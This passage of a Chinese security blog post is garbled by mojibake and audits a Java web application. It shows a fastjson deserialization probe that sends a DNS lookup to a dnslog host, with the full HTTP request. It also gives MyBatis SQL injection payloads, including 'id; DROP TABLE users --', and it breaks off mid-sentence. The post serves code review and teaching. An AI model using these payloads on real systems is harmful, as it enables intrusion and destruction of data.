å¯ä¼ å…¥ payload</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//å‚æ•°å…¨éƒ¨æ”¾å…¥ Mapï¼Œè¿›è¡Œåç»­å¤„ç†</span><br>    Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>    parameterMap.put(Constants.SEARCH, search);<br>    <span class="hljs-type">PageQueryInfo</span> <span class="hljs-variable">queryInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageQueryInfo</span>();<br>    Map&lt;String, Object&gt; objectMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br></code></pre></td></tr></table></figure><hr><p><strong>å°ç»“åˆ©ç”¨é“¾ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>-&gt;<br><span class="hljs-keyword">private</span> List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>-&gt;<br><span class="hljs-type">String</span> <span class="hljs-variable">userName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;userName&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;loginName&quot;</span>);<br>-&gt;<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>-&gt;<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br>-&gt;<br>turn <span class="hljs-title function_">parse</span><span class="hljs-params">(text, DEFAULT_PARSER_FEATURE)</span>;<br>-&gt;<br><span class="hljs-keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);<br>-&gt;<br><span class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();<br>-&gt;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> parse(<span class="hljs-literal">null</span>);<br>&#125;<br>-&gt;<br><span class="hljs-keyword">return</span> parseObject(object, fieldName);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">parseObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map object, Object fieldName)</span> &#123;<br>-&gt;<br>Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="hljs-literal">null</span>, lexer.getFeatures());<br>-&gt;<br><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>-&gt;<br>clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="hljs-literal">true</span>);<br>-&gt;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="hljs-type">boolean</span> cache) <br>-&gt;<br><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">deserializer</span> <span class="hljs-operator">=</span> config.getDeserializers().get(clazz);<br><br></code></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>@typeï¼šæŒ‡å®š fastjson è¦å®ä¾‹åŒ–çš„ç±»ï¼Œ valï¼šè¿™ä¸ªç±»çš„æŸä¸ªå­—æ®µå€¼  </p><p><code>Inet4Address</code> åªèƒ½è§£æ IP&#x2F;åŸŸåï¼Œä¸èƒ½è§¦å‘ LDAP è¯·æ±‚  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">user/list?search=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22ccne35.dnslog.cn%22%7D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.28.192.1:8123<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351506.png"></p><h4 id="æ–­ç‚¹è°ƒè¯•ï¼š"><a href="#æ–­ç‚¹è°ƒè¯•ï¼š" class="headerlink" title="æ–­ç‚¹è°ƒè¯•ï¼š"></a>æ–­ç‚¹è°ƒè¯•ï¼š</h4><p>è°ƒè¯•è¿‡ç¨‹åŸºæœ¬å’Œâ€œåˆ†æé“¾â€ä¸­ä¸€è‡´ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351332.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351023.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351524.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351288.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352184.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352076.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352144.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352547.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352250.png"></p><p><font style="color:rgb(34, 34, 38);"></font></p><blockquote><p><font style="color:rgb(34, 34, 38);">é€šè¿‡dnslogæ¢æµ‹fastjsonçš„å‡ ç§æ–¹æ³•ï¼ˆ</font>java.net.Inet4Addressã€Inet6Addressã€InetSocketAddressï¼Œurlï¼‰</p><p><a href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p></blockquote><h4 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">HTTP GET è¯·æ±‚ ï¼š/user/list?search=&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span>&#125;<br>-&gt;ResourceController.java<br><span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                        HttpServletRequest request)</span><br>-&gt;UserComponent.java<br>getUserList#getInfo(search)<br>-&gt;<br>JSONObject.parseObject(search)<br>-&gt;<br>DefaultJSONParser<br>-&gt;<br>parse <br>-&gt;<br>checkAutoType<br>-&gt;<br>loadClass<br>-&gt;<br>TypeUtils.loadClass<br>-&gt;<br>config.getDeserializers().get(clazz)<br>-&gt;<br>Inet4Address<br>-&gt;<br>MiscCodec#ObjectDeserializer<br>-&gt;<br><span class="hljs-keyword">return</span> InetAddress.getByName(strVal); <span class="hljs-comment">//å°†strValä½œä¸ºä¸»æœºå,è·å–å…¶å¯¹åº”çš„ipï¼ŒåŸŸååœ¨æ­¤å¤„è¢«è§£æ</span><br></code></pre></td></tr></table></figure><h3 id="2-2-log4j-ï¼ˆä¸å­˜åœ¨ï¼‰"><a href="#2-2-log4j-ï¼ˆä¸å­˜åœ¨ï¼‰" class="headerlink" title="2.2 log4j ï¼ˆä¸å­˜åœ¨ï¼‰"></a>2.2 log4j ï¼ˆä¸å­˜åœ¨ï¼‰</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353028.png"></p><p>å¹¶æ²¡æœ‰å¯¼å…¥ log4j-core åŒ…ï¼Œå•ç‹¬çš„ log4j-to-slf4j  æ˜¯ä¸å­˜åœ¨æ¼æ´çš„</p><p><code>log4j-to-slf4j</code> æ˜¯ä¸€ä¸ª <strong>æ¡¥æ¥å™¨ï¼ˆbridgeï¼‰</strong>ï¼Œå®ƒæŠŠ Log4j 2 API çš„è°ƒç”¨è½¬å‘åˆ° SLF4Jï¼Œç”± SLF4J æ¥çœŸæ­£æ‰“å°  </p><h3 id="2-3-MyBatis-CVE-2020-26945ï¼ˆä¸å­˜åœ¨ï¼‰"><a href="#2-3-MyBatis-CVE-2020-26945ï¼ˆä¸å­˜åœ¨ï¼‰" class="headerlink" title="2.3 MyBatis CVE-2020-26945ï¼ˆä¸å­˜åœ¨ï¼‰"></a>2.3 MyBatis <strong><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945ï¼ˆä¸å­˜åœ¨ï¼‰</font></strong></h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353100.png"></p><h4 id="æ¼æ´ç‚¹åˆ†æï¼š"><a href="#æ¼æ´ç‚¹åˆ†æï¼š" class="headerlink" title="æ¼æ´ç‚¹åˆ†æï¼š"></a>æ¼æ´ç‚¹åˆ†æï¼š</h4><p><font style="color:rgb(51, 51, 51);">SerializedCache#deserialize()</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//ä»åº•å±‚çš„ delegateï¼ˆè¢«ä»£ç†çš„å¯¹è±¡ï¼Œä¸€èˆ¬æ˜¯ä¸€ä¸ªç¼“å­˜æˆ–Mapï¼‰ä¸­å–å€¼</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> delegate.getObject(key);<br>    <span class="hljs-comment">// å¦‚æœå–åˆ°çš„å€¼æ˜¯ null(è¿‡æœŸ)ï¼Œç›´æ¥è¿”å› nullï¼›</span><br>    <span class="hljs-comment">// å¦åˆ™å°†å–åˆ°çš„å€¼å¼ºè½¬ä¸º byte[]ï¼Œå†è°ƒç”¨ deserialize æ–¹æ³•ååºåˆ—åŒ–ï¼Œæ¢å¤æˆåŸæ¥çš„å¯¹è±¡</span><br>    <span class="hljs-comment">//deserialize((byte[]) object) å°±æ˜¯ RCE çš„è§¦å‘ç‚¹äº†</span><br>    <span class="hljs-keyword">return</span> object == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : deserialize((<span class="hljs-type">byte</span>[]) object);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› delegate.getObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Cache</span> &#123;<br>    ...<br>    Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>getObject    ctrl+alt+å·¦é”® è½¬åˆ°å£°æ˜</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353445.png"></p><p> è·Ÿè¿›åˆ° ScheduledCache  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//clearWhenStale() æ£€æŸ¥ç¼“å­˜æ˜¯å¦â€œè¿‡æœŸâ€</span><br>    <span class="hljs-keyword">return</span> clearWhenStale() ? <span class="hljs-literal">null</span> : delegate.getObject(key);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">clearWhenStale</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (System.currentTimeMillis() - lastClear &gt; clearInterval) &#123;<br>        clear();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a><font style="color:rgb(34, 34, 34);">åˆ©ç”¨æ¡ä»¶</font></h4><ol><li><font style="color:rgb(53, 53, 53);">ç”¨æˆ·å¯ç”¨äº†äºŒçº§ç¼“å­˜åŠŸèƒ½</font></li></ol><blockquote><p><font style="color:rgb(53, 53, 53);">äºŒçº§ç¼“å­˜å…¶å®å°±æ˜¯å°†æŸ¥è¯¢çš„ç»“æœï¼Œæ”¾å…¥ç¼“å­˜ä¸­ï¼Œä¸‹æ¬¡æŸ¥è¯¢ç›¸åŒçš„æ¡ä»¶æ—¶ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­è·å–ç»“æœï¼Œé™ä½sqlæœåŠ¡å™¨çš„å‹åŠ›</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353146.png"></p></blockquote><ol start="2"><li><font style="color:rgb(53, 53, 53);">æ”»å‡»è€…å¯ä»¥ä¿®æ”¹ç¼“å­˜çš„å†…å®¹ï¼Œæ›¿æ¢ä¸ºæ¶æ„ååºåˆ—åŒ–æ•°æ®</font></li><li><font style="color:rgb(53, 53, 53);">ç”¨æˆ·æœªè®¾ç½®JEP-290è¿‡æ»¤ï¼Œä¸”æ²¡æœ‰ä»»ä½•é˜²å¾¡ååºåˆ—åŒ–æ”»å‡»çš„æªæ–½</font></li></ol><blockquote><p><strong>JEP-290 æ˜¯ä» Java 9 å¼€å§‹å¼•å…¥çš„</strong>ï¼Œåœ¨ Java 8 é‡Œ <strong>ä¸å­˜åœ¨å…¨å±€æˆ–ç±»çº§åºåˆ—åŒ–è¿‡æ»¤å™¨</strong> çš„æœºåˆ¶  </p></blockquote><p><strong>ç”±äºæ‰¾ä¸åˆ°å¯ä¿®æ”¹çš„ç¼“å­˜å†…å®¹ï¼Œè¿™éƒ¨åˆ†å°±ä½œä¸ºæ¼æ´å­¦ä¹ ä¸€éï¼Œæœ¬ç³»ç»Ÿä¸å­˜åœ¨æ­¤æ¼æ´</strong></p><h2 id="æ¥ä¸‹æ¥çš„å®¡è®¡æŒ‰ç…§ä»¥ä¸‹æ–¹å‘è¿›è¡Œï¼š"><a href="#æ¥ä¸‹æ¥çš„å®¡è®¡æŒ‰ç…§ä»¥ä¸‹æ–¹å‘è¿›è¡Œï¼š" class="headerlink" title="æ¥ä¸‹æ¥çš„å®¡è®¡æŒ‰ç…§ä»¥ä¸‹æ–¹å‘è¿›è¡Œï¼š"></a>æ¥ä¸‹æ¥çš„å®¡è®¡æŒ‰ç…§ä»¥ä¸‹æ–¹å‘è¿›è¡Œï¼š</h2><ol><li>SQL æ³¨å…¥</li><li><del>æ–‡ä»¶å®‰å…¨ ï¼ˆåœ¨ç¿»æ‰¾åŠŸèƒ½ç‚¹è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰å‘ç°æœ‰èƒ½ä¸Šä¼ &amp;è¯»å–æ–‡ä»¶çš„ç‚¹ï¼‰</del></li><li>èº«ä»½éªŒè¯&amp;é‰´æƒ ï¼ˆLogCostFilter.javaï¼‰</li><li>ç¬¬ä¸‰æ–¹ç»„ä»¶&amp;ä¾èµ– ï¼ˆå·²åˆ†æï¼‰</li></ol><h2 id="3ã€Mybatis-SQL-æ³¨å…¥"><a href="#3ã€Mybatis-SQL-æ³¨å…¥" class="headerlink" title="3ã€Mybatis SQL æ³¨å…¥"></a>3ã€Mybatis SQL æ³¨å…¥</h2><p>Mybatisæ¡†æ¶çš„sqlæ³¨å…¥å…³æ³¨<code>${}</code>ï¼š</p><p><code>${}</code>ç”¨äºç›´æ¥æ›¿æ¢SQLè¯­å¥ä¸­çš„å ä½ç¬¦ï¼Œè€Œ<code>#{}</code>ç”¨äºé¢„ç¼–è¯‘</p><ol><li>likeæ¨¡ç³ŠæŸ¥è¯¢</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xmlæ¨¡æ¿ï¼š<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%$&#123;name&#125;%&#x27;</span><br><br><span class="hljs-keyword">sql</span>æ³¨å…¥ï¼š<br><span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>æ‰§è¡Œ<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%%&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1%&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>åŠ¨æ€åˆ—å &#x2F; è¡¨å</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xmlæ¨¡æ¿ï¼š<br><span class="hljs-keyword">SELECT</span> $&#123;<span class="hljs-keyword">column</span>&#125; <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> #&#123;id&#125;<br><br><span class="hljs-keyword">sql</span>æ³¨å…¥ï¼š<br><span class="hljs-keyword">column</span> <span class="hljs-operator">=</span> &quot;username, password from users --&quot;<br><br>æ‰§è¡Œ<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- FROM users WHERE id = ?</span><br></code></pre></td></tr></table></figure><ol start="3"><li>Order By</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xmlæ¨¡æ¿ï¼š<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> $&#123;sortColumn&#125;<br><br><span class="hljs-keyword">sql</span>æ³¨å…¥ï¼š<br>sortColumn <span class="hljs-operator">=</span> &quot;id; DROP TABLE users --&quot;<br><br>æ‰§è¡Œ<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><ol start="4"><li>IN</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xmlæ¨¡æ¿ï¼š<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> ($&#123;ids&#125;)<br><br><span class="hljs-keyword">sql</span>æ³¨å…¥ï¼š<br>mapper.findByIds(&quot;1,2,3 OR 1=1&quot;);<br><br>æ‰§è¡Œ<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="AccoutMapperEx-xml"><a href="#AccoutMapperEx-xml" class="headerlink" title="AccoutMapperEx.xml"></a>AccoutMapperEx.xml</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353446.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354889.png"></p><p>æ¥ä¸‹æ¥è€ƒè™‘Controller&#x2F;Service ä¸­æ˜¯å¦ä¼ å…¥äº† name å‚æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354762.png"></p><p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">selectï¼Œ</font></p><p><font style="color:#080808;background-color:#ffffff;"> ä»è¯·æ±‚å‚æ•° map ä¸­è§£ææœç´¢æ¡ä»¶  </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354110.png"></p><p>å¯»æ‰¾è°ƒç”¨ <font style="color:#080808;background-color:#ffffff;">getAccountList() çš„ä½ç½®</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354842.png"></p><p>è·Ÿè¿› select</p><p> <font style="color:#080808;background-color:#ffffff;">select(String apiName, Map&lt;String, String&gt; parameterMap) æ˜¯</font>æ•´ä¸ªæŸ¥è¯¢æ¨¡å—çš„ç»Ÿä¸€å…¥å£  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354949.png"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354239.png"></p><p>æ¥ä¸‹æ¥å»æ‰¾å¯¹åº”çš„åŠŸèƒ½ç‚¹ï¼Œå¯ä»¥å‘ç°ï¼Œåœ¨â€œåŸºæœ¬èµ„æ–™â€ä¸­éƒ½æ˜¯æŸ¥è¯¢æ¥å£ï¼Œè€Œç°åœ¨æˆ‘ä»¬éœ€è¦çš„æ˜¯â€œç»“ç®—è´¦æˆ·â€çš„æŸ¥è¯¢æ¥å£ï¼Œå…¶ä»–çš„æ¥å£ä¹Ÿåº”è¯¥å­˜åœ¨sqlæ³¨å…¥ï¼Œä¹‹åæŸ¥çœ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354668.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355478.png"></p><p>å¯¹â€œç»“ç®—è´¦æˆ·â€çš„æŸ¥è¯¢ç‚¹æŠ“åŒ…åï¼Œæ­£å¥½å¯¹åº”åˆšæ‰æºç 